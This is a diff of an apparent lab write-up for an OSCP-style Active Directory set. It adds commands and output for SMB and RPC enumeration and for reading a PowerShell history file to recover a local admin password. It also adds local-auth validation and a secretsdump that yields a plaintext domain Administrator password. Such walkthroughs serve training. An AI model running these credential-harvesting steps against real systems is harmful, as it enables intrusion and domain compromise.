@@ -1906,21 +1906,81 @@ only host whose token could be escalated, so <code>sql_svc</code> was the plan. 
 </tr>
 </tbody>
 </table>
-<p><strong>A road not taken, and where it starts.</strong> MS02's <em>local</em> Administrator password does not have to
-be cracked. In another pass over this same set it was sitting in a console history file. As
-<code>Administrator</code> on MS01:</p>
+<hr />
+<h3>11.5 <code>web_svc</code> on MS02: what the shares are worth</h3>
+<p><code>web_svc:Diamond1</code> authenticates over SMB, and the share table is a dead end on this build too —
+the same three entries chapter 01 recorded on <code>10.10.152.142</code>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.131.148  445  MS02      ADMIN$                          Remote Admin
+SMB  10.10.131.148  445  MS02      C$                              Default share
+SMB  10.10.131.148  445  MS02      IPC$            READ            Remote IPC</span></pre></div>
+<p>A blank permission column is not "denied", it is "no access": <code>ADMIN$</code> and <code>C$</code> require local
+administrator. Both were tried:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">$ smbclient //10.10.131.148/C$ -U 'OSCP.EXAM\web_svc%Diamond1' -c 'ls'
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+$ smbclient //10.10.131.148/IPC$ -U 'OSCP.EXAM\web_svc%Diamond1' -c 'ls'
+NT_STATUS_NO_SUCH_FILE listing \*</span></pre></div>
+<p><code>IPC$</code> is not storage. It is the endpoint SMB carries RPC over, so <code>READ</code> on it means <em>you may open
+pipes</em>, not <em>you may read files</em>. To read anything, a share has to show <code>READ</code> or <code>WRITE</code>:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.131.148<span class="w"> </span>-u<span class="w"> </span>web_svc<span class="w"> </span>-p<span class="w"> </span>Diamond1<span class="w"> </span>-r
+impacket-smbclient<span class="w"> </span><span class="s1">&#39;oscp.exam/web_svc:Diamond1@10.10.131.148&#39;</span>
+<span class="c1">##   shares</span>
+<span class="c1">##   use C$</span>
+##<span class="w">   </span>ls
+</pre></div>
+<p>With <code>web_svc</code> alone there is nothing to open — the denial above is the honest end of that avenue,
+exactly as chapter 01 concluded. Shares become readable only <em>after</em> the account is a local
+administrator, which is a different chapter.</p>
+<p>What <code>IPC$</code> does buy is RPC. <code>impacket-lookupsid</code> returns MS02's local account set:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[*] Domain SID is: S-1-5-21-2512333080-3128024849-3533006164
+500:  MS02\Administrator (SidTypeUser)
+501:  MS02\Guest (SidTypeUser)
+503:  MS02\DefaultAccount (SidTypeUser)
+504:  MS02\WDAGUtilityAccount (SidTypeUser)
+1003: MS02\cloudbase-init (SidTypeUser)
+1004: MS02\Admin (SidTypeUser)</span></pre></div>
+<p>A user list, no password. It confirms <code>Administrator</code> (RID 500) exists — which is all it is good for
+until that account's password is in hand.</p>
+<hr />
+<h3>11.6 The MS02 local Administrator, end to end</h3>
+<p>MS02's local <code>Administrator</code> password is not cracked and not guessed. It is <strong>typed by an
+administrator on MS01</strong>, into a file that records command history. As <code>Administrator</code> on MS01
+(chapter 08):</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
 C:\users\support\admintool.exe cmd
 shutdown /s /t 7</span></pre></div>
-<p>An administrator ran a helper that takes the local-admin password as an argument, and <code>PSReadLine</code>
-kept the line. Sprayed with <strong>local</strong> authentication, that password opens MS02 as
-<code>MS02\Administrator</code>; MS02's own <code>SECURITY</code> hive then hands over the domain Administrator through
-<code>DefaultPassword</code> and the same DCC2 entry seen in chapter 09.</p>
-<p><strong>This was not run in this pass.</strong> It is recorded because it is the cheapest demonstration that
-MS02's credential store is reachable without touching MS02's services at all — and because it
-answers where that password comes from.</p>
+<p>A helper was run with the local-admin password as an argument, and <code>PSReadLine</code> kept the line. Two
+checks tie that string to MS02 rather than MS01:</p>
+<ol>
+<li><code>NTLM(hghgib6vHT3bVWf)</code> = <code>507e8b20766f720619e9f33d73756b34</code>, byte-for-byte MS02's SAM
+   <code>Administrator:500</code> hash. MS01's is <code>3c4495bb…</code> (<code>December31</code>) — different accounts, different
+   passwords.</li>
+<li>Presented as a <strong>local</strong> logon it is administrative:</li>
+</ol>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">$ nxc smb 10.10.131.148 -u Administrator -p 'hghgib6vHT3bVWf' --local-auth
+SMB  10.10.131.148  445  MS02  [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:None)
+SMB  10.10.131.148  445  MS02  [+] MS02\Administrator:hghgib6vHT3bVWf (Pwn3d!)</span></pre></div>
+<p><code>--local-auth</code> is the whole trick. Sent to the <em>domain</em> instead (<code>-d oscp.exam</code>), <code>Administrator</code>
+resolves to the domain account, not to MS02's SAM — which is why the domain-scoped sprays in this
+run never touched it.</p>
+<p>Now the registry opens, and MS02's <code>SECURITY</code> hive pays better than its cache:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">$ impacket-secretsdump 'Administrator':'hghgib6vHT3bVWf'@10.10.131.148
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:507e8b20766f720619e9f33d73756b34:::
+OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2023-03-02 09:08:34+00:00)
+[*] DefaultPassword
+OSCP.exam\Administrator:7Tg9M9MZbzAokR9</span></pre></div>
+<p><code>DefaultPassword</code> is the domain Administrator's password <strong>in plaintext</strong> — the same credential the
+DCC2 entry in chapter 09 protects. On this set the cache crack is therefore optional: MS02's LSA
+secret hands over the same value without a wordlist.</p>
+<p>The per-host variation is the general lesson. On MS01 the same secret class held
+<code>oscp.exam\celia.almeda:7k8XHk3dMtmpnC7</code>; on MS02 it holds the domain Administrator. <code>DefaultPassword</code>
+is whatever the image baked in — read it on every host, not only the hashes around it.</p>
+<p>Two orderings reach the same credential:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">MS01 SYSTEM → PSReadLine history → MS02 local Administrator → MS02 LSA secrets → domain Administrator
+MS01 SYSTEM → MS01 DCC2 cache → domain Administrator</span></pre></div>
+<p>This run took the second. The first needs one extra hop and no cracking at all.</p>
 <p>DC01 is next.</p></div></section>
 <section class="chapter" id="ch-12" data-title="DC01: proof.txt"><div class="ch-head"><span class="ch-num">12</span><div class="ch-title"><h2>DC01: proof.txt</h2><p class="ch-sub">The cached credential is domain-tier</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The password matching MS01's DCC2 entry for the domain Administrator is used here for the first
 time. It authenticates to the domain controller as the built-in Administrator and returns a SYSTEM
@@ -1947,6 +2007,9 @@ therefore a <strong>domain</strong> logon, not a local one.</p>
 MS01's <code>SECURITY</code> hive (chapter 09), left there by an interactive domain-administrator logon in
 2022. That is the boundary the cache crossed: a member server kept a verifier for the domain
 Administrator, and a local administrator on that member server could read it.</p>
+<p>The same password also sits <strong>in plaintext</strong> in MS02's <code>DefaultPassword</code> LSA secret (chapter 11.6),
+reachable once MS02's local Administrator is owned. Two different servers, two different stores,
+one credential — either path ends at the value used below.</p>
 <hr />
 <h3>12.3 The flag, attributable</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">ls</span>
